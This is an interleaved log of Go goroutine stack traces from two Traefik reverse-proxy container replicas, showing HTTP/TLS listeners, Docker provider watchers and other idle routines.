traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/proc.go:287 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:200
traefik.1.ncnc3bnddh65@ns3000001 | runtime.selectgo( , )
traefik.1.ubjug9usvfo0@ns3000001 | main.run( )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/select.go:395 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:302 +
traefik.1.ncnc3bnddh65@ns3000001 | runtime.ensuresigm.func1()
traefik.1.ubjug9usvfo0@ns3000001 | main.main.func1( , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/signal_unix.go:511 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:59 +
traefik.1.ncnc3bnddh65@ns3000001 | runtime.goexit()
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/containous/staert.(*staert).run( , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/staert.go:83 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/asm_amd64.s:2337 +
traefik.1.ubjug9usvfo0@ns3000001 | main.main()
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:227 +
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 16 [sleep]:
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | time.sleep( )
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 19 [chan receive, 5645 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1.1( , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/time.go:65 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:194 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.operationwithrecover.func1( , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/vendor/github.com/thoas/stats.new
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:160 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:31 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | goroutine 81 [io wait, 60 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1()
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:251 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 15 [chan receive]:
traefik.1.ncnc3bnddh65@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/golang/glog.(*loggingt).flushdaemon( )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:879 +
traefik.1.ncnc3bnddh65@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/vendor/github.com/golang/glog.init.0
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:410 +
traefik.1.ncnc3bnddh65@ns3000001 | net.(*tcplistener).accept( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/tcpsock.go:247 +
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 50 [syscall, 5645 minutes]:
traefik.1.ncnc3bnddh65@ns3000001 | crypto/tls.(*listener).accept( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/crypto/tls/tls.go:52 +
traefik.1.ubjug9usvfo0@ns3000001 | os/signal.signal_recv( )
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*server).servetls( , , , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/sigqueue.go:131 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2764 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...)
traefik.1.ubjug9usvfo0@ns3000001 | os/signal.loop()
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:628 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/os/signal/signal_unix.go:22 +
traefik.1.ubjug9usvfo0@ns3000001 | created by os/signal.init.0
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/server.(*server).starthttpservers
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/os/signal/signal_unix.go:28 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:271 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | goroutine 51 [semacquire, 332 minutes]:
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 82 [sleep]:
traefik.1.ubjug9usvfo0@ns3000001 | sync.runtime_notifylistwait( , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/sema.go:507 +
traefik.1.ncnc3bnddh65@ns3000001 | time.sleep( )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/time.go:65 +
traefik.1.ubjug9usvfo0@ns3000001 | sync.(*cond).wait( )
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/sync/cond.go:56 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
traefik.1.ubjug9usvfo0@ns3000001 | io.(*pipe).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/io/pipe.go:47 +
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/vendor/github.com/thoas/stats.new
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:31 +
traefik.1.ubjug9usvfo0@ns3000001 | io.(*pipereader).read( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/io/pipe.go:130 +
traefik.1.ubjug9usvfo0@ns3000001 | bufio.(*scanner).scan( , )
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 83 [io wait]:
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/bufio/scan.go:207 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerscanner( , , )
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:51 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerlevel
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:43 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | goroutine 52 [chan receive, 1325 minutes]:
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.ubjug9usvfo0@ns3000001 | main.checknewversion.func1()
traefik.1.ncnc3bnddh65@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:349 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ncnc3bnddh65@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | net.(*tcplistener).accept( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/tcpsock.go:247 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 53 [select, 5645 minutes, locked to thread]:
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
traefik.1.ubjug9usvfo0@ns3000001 | runtime.gopark( , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/proc.go:287 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...)
traefik.1.ubjug9usvfo0@ns3000001 | runtime.selectgo( , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:630 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/select.go:395 +
traefik.1.ubjug9usvfo0@ns3000001 | runtime.ensuresigm.func1()
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/server.(*server).starthttpservers
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/signal_unix.go:511 +
traefik.1.ubjug9usvfo0@ns3000001 | runtime.goexit()
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:271 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/asm_amd64.s:2337 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | goroutine 54 [sleep]:
traefik.1.ubjug9usvfo0@ns3000001 | time.sleep( )
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 84 [select]:
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/time.go:65 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/server.(*server).listenproviders( , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:323 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/server.(*server).start.func1( )
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/vendor/github.com/thoas/stats.new
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:188 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:31 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 55 [io wait, 140 minutes]:
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 85 [select, 1694 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/server.(*server).listenconfigurations( , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:375 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/server.(*server).start.func2( )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:191 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*tcplistener).accept( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/tcpsock.go:247 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ubjug9usvfo0@ns3000001 | crypto/tls.(*listener).accept( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/crypto/tls/tls.go:52 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 88 [chan receive, 1694 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/server.(*server).listensignals( )
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*server).servetls( , , , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2764 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server_signals.go:18 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...)
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/server.(*server).start
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:628 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:195 +
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/server.(*server).starthttpservers
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:271 +
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 89 [chan receive, 1694 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1.1( , )
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 56 [sleep]:
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:194 +
traefik.1.ubjug9usvfo0@ns3000001 | time.sleep( )
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.operationwithrecover.func1( , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/time.go:65 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:160 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( )
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 +
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/vendor/github.com/thoas/stats.new
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1()
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:251 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:31 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 57 [io wait, 104 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 91 [io wait]:
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*tcplistener).accept( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/tcpsock.go:247 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*fd).read( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:126 +
traefik.1.ncnc3bnddh65@ns3000001 | net.(*netfd).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/fd_unix.go:202 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...)
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:630 +
traefik.1.ncnc3bnddh65@ns3000001 | net.(*conn).read( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/net.go:176 +
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/server.(*server).starthttpservers
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*persistconn).read( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/transport.go:1391 +
traefik.1.ncnc3bnddh65@ns3000001 | bufio.(*reader).fill( )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:271 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/bufio/bufio.go:97 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | bufio.(*reader).peek( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 58 [select]:
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/server.(*server).listenproviders( , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/bufio/bufio.go:129 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:323 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/server.(*server).start.func1( )
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*persistconn).readloop( )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:188 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/transport.go:1539 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.ncnc3bnddh65@ns3000001 | created by net/http.(*transport).dialconn
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/transport.go:1186 +
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 92 [select]:
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*persistconn).writeloop( )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/transport.go:1759 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | created by net/http.(*transport).dialconn
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 59 [select, 5645 minutes]:
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/transport.go:1187 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/server.(*server).listenconfigurations( , )
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:375 +
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 21 [io wait]:
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/server.(*server).start.func2( )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:191 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 65 [select]:
traefik.1.ncnc3bnddh65@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1.1.1( )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:171 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
